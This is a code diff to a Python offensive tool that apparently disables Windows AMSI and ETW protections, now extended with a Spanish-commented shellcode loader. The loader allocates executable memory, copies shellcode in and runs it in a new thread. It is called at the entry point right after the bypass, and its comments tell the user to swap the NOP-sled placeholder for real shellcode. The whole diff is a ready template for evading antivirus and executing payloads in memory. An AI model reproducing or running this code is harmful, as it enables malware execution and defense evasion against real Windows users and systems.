@@ -193,6 +193,83 @@ def invoke_nullamsi(verbose_flag=False, etw_flag=False):
         else:
             print(f"[-] FAILED: Could not find address for {etw_target.decode()}.")
 
+import ctypes
+import sys
+
+# 1. Shellcode de Ejemplo (Placeholder)
+# Nota: Este es un shellcode DE EJEMPLO. En un escenario real,
+# aquí pondrías tu shellcode real. Este placeholder es solo para
+# demostrar la estructura del script.
+# *Reemplaza la matriz de bytes con tu shellcode real.*
+# (El shellcode real para un MessageBoxA es largo y complejo de generar manualmente)
+SHELLCODE = b"\x90\x90\x90\x90" * 20  # NOP Sled simple como placeholder (80 bytes de \x90)
+
+def load_shellcode_windows(shellcode_bytes):
+    """
+    Asigna memoria, copia el shellcode y lo ejecuta en un nuevo hilo
+    utilizando la API de Windows.
+    """
+    
+    if not sys.platform.startswith('win'):
+        print("[-] Este script está diseñado para Windows.")
+        return
+
+    # Definiciones de constantes de la API de Windows
+    MEM_COMMIT = 0x1000
+    MEM_RESERVE = 0x2000
+    PAGE_EXECUTE_READWRITE = 0x40
+
+    shellcode_len = len(shellcode_bytes)
+
+    # 1. Asignar memoria para el shellcode
+    # Utilizamos VirtualAlloc para obtener un bloque de memoria con permisos de ejecución
+    kernel32 = ctypes.windll.kernel32
+    
+    # lpAddress=None, dwSize=shellcode_len, flAllocationType=MEM_COMMIT | MEM_RESERVE, flProtect=PAGE_EXECUTE_READWRITE
+    ptr = kernel32.VirtualAlloc(
+        None, 
+        shellcode_len, 
+        MEM_COMMIT | MEM_RESERVE, 
+        PAGE_EXECUTE_READWRITE
+    )
+
+    if ptr is None or ptr == 0:
+        print(f"[-] Error al asignar memoria: {kernel32.GetLastError()}")
+        return
+
+    print(f"[+] Memoria asignada en: 0x{ptr:x}")
+
+    # 2. Copiar el shellcode a la memoria asignada
+    # Usamos RtlMoveMemory (o memmove) para copiar los bytes del shellcode
+    ctypes.memmove(ptr, shellcode_bytes, shellcode_len)
+    
+    # 3. Ejecutar el shellcode
+    # Creamos un hilo para ejecutar el shellcode.
+    # lpThreadAttributes=None, dwStackSize=0, lpStartAddress=ptr, lpParameter=None
+    h_thread = kernel32.CreateThread(
+        None, 
+        0, 
+        ptr, 
+        None, 
+        0, 
+        None
+    )
+
+    if h_thread is None or h_thread == 0:
+        print(f"[-] Error al crear el hilo: {kernel32.GetLastError()}")
+        print("[!] Nota: La asignación de memoria persiste.")
+        # Opcional: Liberar la memoria con VirtualFree
+        # kernel32.VirtualFree(ptr, 0, 0x8000) # MEM_RELEASE
+        return
+
+    print(f"[+] Shellcode ejecutándose en el hilo: {h_thread}")
+
+    # Esperar a que el hilo termine (importante si el shellcode hace algo visible)
+    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF) # 0xFFFFFFFF = INFINITE
+
+    print("[+] Ejecución del shellcode finalizada.")
+    
+
 
 # Entry point
 if __name__ == "__main__":
@@ -207,3 +284,6 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     invoke_nullamsi(verbose_flag=args.verbose, etw_flag=args.etw)
+
+    if SHELLCODE == b"\x90\x90\x90\x90" * 20:
+        load_shellcode_windows(SHELLCODE)
